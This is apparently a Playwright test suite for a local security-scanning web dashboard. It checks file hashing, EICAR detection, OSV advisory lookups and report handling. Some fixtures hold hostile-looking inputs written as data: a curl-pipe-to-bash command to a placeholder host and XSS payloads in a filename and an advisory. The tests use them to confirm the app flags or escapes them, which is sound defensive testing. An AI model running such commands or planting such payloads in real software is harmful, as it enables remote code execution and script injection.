"use strict";
const { test, before, after } = require("node:test");
const assert = require("node:assert/strict");
const { spawn } = require("node:child_process");
const { createHash } = require("node:crypto");
const { chromium } = require("playwright");
const path = require("node:path");
const os = require("node:os");
const fs = require("node:fs");

const port = process.env.AEGIS_TEST_PORT || "8765";
const base = `http://127.0.0.1:${port}`;
let server, browser;
const eicar = [
  "X5O!P%@AP[4",
  "\\PZX54(P^)7CC)7}$",
  "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
].join("");
const errors = [];

before(async () => {
  server = spawn(
    "python3",
    ["-m", "http.server", port, "--bind", "127.0.0.1"],
    { cwd: path.resolve(__dirname, ".."), stdio: "ignore" },
  );
  server.on("error", (error) => errors.push(error.message));
  let ready = false;
  for (let i = 0; i < 50; i++) {
    try {
      const r = await fetch(base);
      if (r.ok) {
        ready = true;
        break;
      }
    } catch {}
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  assert.ok(ready, "Test server must respond");
  const executablePath =
    process.env.CHROMIUM_PATH ||
    (fs.existsSync("/usr/bin/chromium") ? "/usr/bin/chromium" : undefined);
  browser = await chromium.launch({
    executablePath,
    headless: true,
    args: ["--no-sandbox"],
  });
});
after(async () => {
  if (browser) await browser.close();
  if (server) server.kill();
  assert.deepEqual(errors, []);
});

async function withPage(fn, options = {}) {
  const context = await browser.newContext({
    viewport: { width: 1440, height: 1000 },
    acceptDownloads: true,
    ...options,
  });
  const page = await context.newPage();
  page.setDefaultTimeout(10000);
  page.setDefaultNavigationTimeout(10000);
  const pageErrors = [];
  page.on("pageerror", (error) => pageErrors.push(error.message));
  try {
    await page.goto(base);
    await fn(page, context);
    assert.deepEqual(pageErrors, [], "No unhandled application errors");
  } finally {
    await context.close();
  }
}
async function upload(page, name, content, type = "application/octet-stream") {
  await page
    .locator("#file-input")
    .setInputFiles({ name, mimeType: type, buffer: Buffer.from(content) });
  await page.waitForFunction(
    () =>
      document.querySelector("#scan-progress").hidden &&
      document.querySelector(".file-result"),
  );
}
async function exportedReports(page) {
  await page.goto(base + "/#reports");
  const downloaded = page.waitForEvent("download");
  await page.locator("#export-all").click();
  const download = await downloaded;
  return JSON.parse(fs.readFileSync(await download.path(), "utf8"));
}

test("dashboard has honest empty state, local assets and no automatic external requests", async () =>
  withPage(async (page) => {
    const remoteRequests = [];
    page.on("request", (request) => {
      if (!request.url().startsWith(base)) remoteRequests.push(request.url());
    });
    await page.reload();
    await page.evaluate(() => document.fonts.ready);
    assert.equal(await page.locator("#stat-files").innerText(), "0");
    assert.match(
      await page.locator("#recent-activity").innerText(),
      /prima analisi/,
    );
    assert.equal(await page.locator("#menu-toggle").isVisible(), false);
    assert.deepEqual(remoteRequests, []);
    assert.equal(await page.evaluate(() => localStorage.length), 0);
  }));

test("all pages fit desktop, tablet and mobile; menu works by keyboard", async () =>
  withPage(async (page) => {
    for (const width of [360, 390, 768, 1024, 1440]) {
      await page.setViewportSize({ width, height: 900 });
      for (const view of [
        "overview",
        "device",
        "files",
        "browser",
        "vulnerabilities",
        "reports",
        "guide",
      ]) {
        await page.goto(`${base}/#${view}`);
        assert.ok(await page.locator(`#view-${view}`).isVisible());
        assert.ok(
          await page.evaluate(
            () => document.documentElement.scrollWidth <= innerWidth + 1,
          ),
          `${view} overflows at ${width}px`,
        );
      }
    }
    await page.setViewportSize({ width: 390, height: 844 });
    await page.locator("#menu-toggle").click();
    assert.equal(
      await page.locator("#menu-toggle").getAttribute("aria-expanded"),
      "true",
    );
    await page.locator('.nav-item[data-view="files"]').click();
    await page.waitForURL("**/#files");
    assert.equal(
      await page.locator("#menu-toggle").getAttribute("aria-expanded"),
      "false",
    );
    await page.waitForFunction(
      () =>
        !document.querySelector("#view-files").hidden &&
        document.activeElement.id === "main",
    );
    await page.locator("#drop-files").focus();
    const chooserPromise = page.waitForEvent("filechooser");
    await page.keyboard.press("Enter");
    await chooserPromise;
  }));

test("normal file is read fully with exact SHA-256; no clean bill of health", async () =>
  withPage(async (page) => {
    const content = "Un documento normale.\n";
    await upload(page, "appunti.txt", content, "text/plain");
    assert.match(
      await page.locator(".file-result").innerText(),
      /non certifica la sicurezza/,
    );
    const exported = await exportedReports(page);
    assert.equal(exported.reports.length, 1);
    const result = exported.reports[0].data;
    assert.equal(
      result.sha256,
      createHash("sha256").update(content).digest("hex"),
    );
    assert.equal(result.bytesRead, Buffer.byteLength(content));
    assert.equal(result.complete, true);
    assert.deepEqual(result.findings, []);
  }));

test("EICAR is detected across a chunk boundary and labelled as an innocuous test", async () =>
  withPage(async (page) => {
    const content = Buffer.concat([
      Buffer.alloc(1024 * 1024 - 12, 32),
      Buffer.from(eicar),
      Buffer.from(" tail"),
    ]);
    await upload(page, "test-eicar.txt", content, "text/plain");
    const result = (await exportedReports(page)).reports[0].data;
    assert.ok(
      result.findings.some((f) => f.id === "eicar" && f.level === "test"),
    );
    assert.equal(result.bytesRead, content.length);
    assert.equal(
      result.sha256,
      createHash("sha256").update(content).digest("hex"),
    );
    assert.ok(
      result.findings.some((f) => f.detail.includes("non un virus reale")),
    );
  }));

test("disguised executable and shell commands are indicators, not malware verdicts", async () =>
  withPage(async (page) => {
    await page.locator("#file-input").setInputFiles([
      {
        name: "fattura.pdf.exe",
        mimeType: "application/octet-stream",
        buffer: Buffer.from("MZ dangerous-looking, not real executable"),
      },
      {
        name: "foto.png",
        mimeType: "image/png",
        buffer: Buffer.from("MZ disguised header"),
      },
      {
        name: "install.sh",
        mimeType: "text/plain",
        buffer: Buffer.from(
          "#!/bin/sh\ncurl https://example.invalid/a | bash\n",
        ),
      },
    ]);
    await page.waitForFunction(
      () =>
        document.querySelectorAll(".file-result").length === 3 &&
        document.querySelector("#scan-progress").hidden,
    );
    const items = (await exportedReports(page)).reports;
    assert.ok(
      items
        .find((r) => r.title === "fattura.pdf.exe")
        .data.findings.some((f) => f.id === "double-extension"),
    );
    assert.ok(
      items
        .find((r) => r.title === "foto.png")
        .data.findings.some((f) => f.id === "header-mismatch"),
    );
    assert.ok(
      items
        .find((r) => r.title === "install.sh")
        .data.findings.some((f) => f.id === "shell-pipe"),
    );
    await page.goto(base + "/#overview");
    assert.equal(await page.locator("#stat-findings").innerText(), "3");
  }));

test("empty files hash correctly; archives explicitly report that contents were not extracted", async () =>
  withPage(async (page) => {
    await upload(page, "vuoto.txt", "");
    let data = (await exportedReports(page)).reports[0].data;
    assert.equal(data.bytesRead, 0);
    assert.equal(data.sha256, createHash("sha256").update("").digest("hex"));
    await upload(
      page,
      "archivio.zip",
      Buffer.from([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0]),
    );
    data = (await exportedReports(page)).reports[0].data;
    assert.ok(data.findings.some((f) => f.id === "archive"));
  }));

test("hash memory limit is explicit; oversized files are refused and excluded from completed count", async () =>
  withPage(async (page) => {
    await page.evaluate(() => {
      const transfer = new DataTransfer();
      transfer.items.add(
        new File([new Uint8Array(33 * 1024 * 1024)], "large.bin"),
      );
      transfer.items.add(
        new File([new Uint8Array(128 * 1024 * 1024 + 1)], "too-large.bin"),
      );
      const input = document.querySelector("#file-input");
      input.files = transfer.files;
      input.dispatchEvent(new Event("change"));
    });
    await page.waitForFunction(
      () =>
        document.querySelectorAll(".file-result").length === 2 &&
        document.querySelector("#scan-progress").hidden,
      {},
      { timeout: 30000 },
    );
    const items = (await exportedReports(page)).reports;
    const large = items.find((r) => r.title === "large.bin").data;
    assert.equal(large.complete, true);
    assert.equal(large.bytesRead, 33 * 1024 * 1024);
    assert.equal(large.sha256, null);
    assert.match(large.hashNote, /32 MiB/);
    assert.equal(
      items.find((r) => r.title === "too-large.bin").status,
      "error",
    );
    await page.goto(base + "/#overview");
    assert.equal(await page.locator("#stat-files").innerText(), "1");
  }));

test("cancel stops a worker and never creates a completed result for unfinished files", async () =>
  withPage(async (page) => {
    // Slow the worker wrapper so that cancellation is deterministic rather than racing the CPU.
    await page.evaluate(() => {
      const NativeWorker = window.Worker;
      window.Worker = class extends NativeWorker {
        postMessage(...args) {
          this.delay = setTimeout(() => super.postMessage(...args), 1000);
        }
        terminate() {
          clearTimeout(this.delay);
          return super.terminate();
        }
      };
    });
    await page.locator("#file-input").setInputFiles({
      name: "cancel.txt",
      mimeType: "text/plain",
      buffer: Buffer.from("cancel me"),
    });
    await page.locator("#scan-cancel").click();
    await page.waitForFunction(
      () => document.querySelector("#scan-progress").hidden,
    );
    assert.equal(await page.locator(".file-result").count(), 0);
    assert.match(
      await page.locator("#queue-label").innerText(),
      /1 non analizzato/,
    );
    await page.goto(base + "/#reports");
    assert.equal(await page.locator("#export-all").isDisabled(), true);
  }));

test("browser checks execute a known-answer SHA-256 test and produce five scoped findings", async () =>
  withPage(async (page) => {
    await page.locator("#quick-browser").click();
    await page.waitForFunction(
      () => document.querySelectorAll(".browser-check").length === 5,
    );
    const data = (await exportedReports(page)).reports[0].data;
    assert.equal(data.checks.length, 5);
    assert.equal(
      data.checks.find((c) => c.id === "crypto").evidence.knownAnswerTest,
      true,
    );
    assert.equal(data.checks.find((c) => c.id === "csp").status, "info");
    assert.equal(
      data.checks.find((c) => c.id === "secure").evidence.loopback,
      true,
    );
  }));

test("report persistence is opt-in, reloadable, and deletion requires confirmation", async () =>
  withPage(async (page) => {
    await upload(page, "report.txt", "persist only after opt-in");
    await page.reload();
    assert.equal(await page.locator("#report-count").innerText(), "0");
    await upload(page, "report.txt", "persist only after opt-in");
    await page.goto(base + "/#reports");
    await page.locator("#remember-reports").check();
    await page.reload();
    assert.equal(await page.locator("#report-count").innerText(), "1");
    assert.equal(await page.locator("#remember-reports").isChecked(), true);
    await page.locator("#clear-reports").click();
    assert.equal(await page.locator("#confirm-dialog").isVisible(), true);
    await page.locator("#confirm-cancel").click();
    assert.equal(await page.locator("#report-count").innerText(), "1");
    await page.locator("#clear-reports").click();
    await page.locator("#confirm-delete").click();
    await page.reload();
    assert.equal(await page.locator("#report-count").innerText(), "0");
  }));

test("OSV request sends only package metadata; advisory markup is escaped (mocked API)", async () =>
  withPage(async (page) => {
    let posted;
    await page.route("https://api.osv.dev/v1/query", async (route) => {
      posted = route.request().postDataJSON();
      await route.fulfill({
        status: 200,
        contentType: "application/json",
        body: JSON.stringify({
          vulns: [
            {
              id: "TEST-ADVISORY-1",
              summary: "<img src=x onerror=alert(1)>",
              aliases: ["CVE-TEST-0001"],
              database_specific: { severity: "HIGH" },
              affected: [
                {
                  ranges: [
                    { events: [{ introduced: "0" }, { fixed: "4.17.21" }] },
                  ],
                },
              ],
              references: [{ type: "ADVISORY", url: "javascript:alert(1)" }],
            },
          ],
        }),
      });
    });
    await page.goto(base + "/#vulnerabilities");
    await page.locator("#package-name").fill("lodash");
    await page.locator("#package-version").fill("4.17.20");
    await page.locator("#vulnerability-submit").click();
    await page.waitForSelector(".vuln-card");
    assert.deepEqual(posted, {
      package: { name: "lodash", ecosystem: "npm" },
      version: "4.17.20",
    });
    assert.equal(await page.locator(".vuln-card img").count(), 0);
    assert.match(await page.locator(".vuln-card").innerText(), /<img src=x/);
    assert.equal(await page.locator('a[href^="javascript:"]').count(), 0);
    assert.match(await page.locator(".vuln-card").innerText(), /4.17.21/);
  }));

test("OSV empty result and network failure stay distinct (mocked API)", async () =>
  withPage(async (page) => {
    let fail = false;
    await page.route("https://api.osv.dev/v1/query", (route) =>
      fail
        ? route.abort("failed")
        : route.fulfill({
            status: 200,
            contentType: "application/json",
            body: "{}",
          }),
    );
    await page.goto(base + "/#vulnerabilities");
    await page.locator("#package-name").fill("a-package");
    await page.locator("#package-version").fill("1.0.0");
    await page.locator("#vulnerability-submit").click();
    await page.waitForFunction(() =>
      document
        .querySelector("#vulnerability-results")
        .textContent.includes("Nessuna corrispondenza"),
    );
    assert.match(
      await page.locator("#vulnerability-results").innerText(),
      /Non certifica/,
    );
    fail = true;
    await page.locator("#vulnerability-submit").click();
    await page.waitForFunction(() =>
      document
        .querySelector("#vulnerability-results")
        .textContent.includes("Ricerca non completata"),
    );
    assert.match(
      await page.locator("#vulnerability-results").innerText(),
      /Nessun esito/,
    );
    assert.equal(await page.locator("#report-count").innerText(), "1");
  }));

test("filenames cannot execute markup; screenshots are generated for visual review", async () =>
  withPage(async (page) => {
    await upload(
      page,
      "<img src=x onerror=alert(1)>.txt",
      "just text",
      "text/plain",
    );
    assert.equal(await page.locator(".file-result img").count(), 0);
    assert.match(
      await page.locator(".file-result h3").innerText(),
      /<img src=x/,
    );
    await page.goto(base);
    await page.evaluate(() => document.fonts.ready);
    await page.screenshot({
      path: path.join(os.tmpdir(), "aegis-desktop.png"),
      fullPage: true,
      animations: "disabled",
    });
    await page.setViewportSize({ width: 390, height: 844 });
    await page.screenshot({
      path: path.join(os.tmpdir(), "aegis-mobile.png"),
      fullPage: true,
      animations: "disabled",
    });
  }));

test("public device page gives real setup instructions without claiming a Mac model", async () =>
  withPage(async (page) => {
    await page.goto(base + "/#device");
    assert.equal(await page.locator("#agent-setup").isVisible(), true);
    assert.equal(await page.locator("#agent-controls").isVisible(), false);
    assert.match(
      await page.locator("#download-agent").getAttribute("href"),
      /github\.com\/xx1805xx\/xx1805xx\/archive/,
    );
    assert.match(await page.locator("#agent-setup").innerText(), /Python 3.9/);
    assert.doesNotMatch(
      await page.locator("#device-detected").innerText(),
      /Apple M6|MacBookPro\d/,
    );
  }));

test("native UI authenticates, preserves unavailable checks, exports and deduplicates reports (mocked Mac)", async () =>
  withPage(async (page) => {
    const fixture = {
      schema: "aegis-native-report-1",
      id: "fixture-not-real-hardware",
      startedAt: new Date().toISOString(),
      finishedAt: new Date().toISOString(),
      complete: false,
      scope: "~/Downloads",
      limits: ["Fixture only; not a real Mac scan."],
      checks: [
        {
          id: "hardware",
          title: "Identificazione del Mac",
          status: "info",
          detail: "Test fixture, not real hardware",
          evidence: {
            modelIdentifier: "FixtureMac",
            chip: "Fixture chip",
            macOS: "fixture",
            build: "fixture",
            architecture: "fixture",
          },
        },
        {
          id: "malware",
          title: "Scansione antivirus · ClamAV",
          status: "blocked",
          detail:
            "ClamAV non è installato: nessuna scansione antivirus è stata eseguita.",
          evidence: {},
        },
      ],
    };
    let started = false,
      posted;
    await page.route(base + "/api/session", (route) =>
      route.fulfill({
        contentType: "application/json",
        body: JSON.stringify({
          token: "fixture-session-token",
          version: "fixture",
        }),
      }),
    );
    await page.route(base + "/api/state", (route) => {
      assert.equal(
        route.request().headers()["x-aegis-token"],
        "fixture-session-token",
      );
      return route.fulfill({
        contentType: "application/json",
        body: JSON.stringify({
          version: "fixture",
          supported: true,
          clamavAvailable: false,
          selectedDirectory: null,
          job: {
            state: started ? "finished" : "idle",
            current: "Fixture",
            report: started ? fixture : null,
          },
        }),
      });
    });
    await page.route(base + "/api/scan", (route) => {
      posted = route.request().postDataJSON();
      started = true;
      return route.fulfill({
        status: 202,
        contentType: "application/json",
        body: JSON.stringify({
          version: "fixture",
          supported: true,
          job: { state: "finished", current: "Fixture", report: fixture },
        }),
      });
    });
    await page.goto(base + "/#device");
    await page.reload();
    await page.waitForSelector("#agent-controls", { state: "visible" });
    await page.locator("#native-start").click();
    await page.waitForSelector(".native-check");
    assert.deepEqual(posted, {
      scope: "downloads",
      scanMalware: true,
      updateSignatures: true,
      appleUpdates: false,
    });
    assert.match(
      await page.locator("#native-report").innerText(),
      /Copertura incompleta/,
    );
    assert.match(
      await page.locator("#native-report").innerText(),
      /Non disponibile/,
    );
    assert.equal(
      await page.locator("#device-detected").innerText(),
      "FixtureMac · Fixture chip",
    );
    const exported = await exportedReports(page);
    assert.equal(exported.reports[0].type, "device");
    assert.equal(exported.reports[0].data.complete, false);
    assert.doesNotMatch(
      await page.locator("#reports-list").innerText(),
      /Nessuna corrispondenza/,
    );
    await page.locator("#remember-reports").check();
    await page.reload();
    await page.waitForFunction(() =>
      document.querySelector("#agent-status").textContent.includes("collegato"),
    );
    assert.equal(await page.locator("#report-count").innerText(), "1");
    assert.ok(
      !(await page.evaluate(() => JSON.stringify(localStorage))).includes(
        "fixture-session-token",
      ),
    );
  }));

test("real local agent connects on this host and refuses to pretend Linux is macOS", async () => {
  const agent = spawn("python3", ["native/agent.py", "--no-browser"], {
    cwd: path.resolve(__dirname, ".."),
    stdio: ["ignore", "pipe", "pipe"],
  });
  let text = "";
  try {
    const origin = await new Promise((resolve, reject) => {
      const timer = setTimeout(
        () => reject(new Error("Agent startup timeout")),
        5000,
      );
      agent.stdout.on("data", (chunk) => {
        text += chunk;
        const match = text.match(/http:\/\/127\.0\.0\.1:\d+/);
        if (match) {
          clearTimeout(timer);
          resolve(match[0]);
        }
      });
      agent.on("error", (error) => {
        clearTimeout(timer);
        reject(error);
      });
    });
    const context = await browser.newContext();
    try {
      const page = await context.newPage();
      await page.goto(origin + "/#device");
      await page.waitForFunction(
        () =>
          document.querySelector("#agent-status").textContent !==
          "Agente non collegato",
      );
      if (process.platform !== "darwin") {
        assert.equal(
          await page.locator("#agent-status").innerText(),
          "Host non supportato",
        );
        assert.equal(await page.locator("#agent-controls").isVisible(), false);
        assert.match(
          await page.locator("#platform-instructions").innerText(),
          /non stai analizzando il tuo Mac da remoto/,
        );
      } else {
        assert.equal(await page.locator("#agent-controls").isVisible(), true);
      }
    } finally {
      await context.close();
    }
  } finally {
    agent.kill("SIGTERM");
  }
});
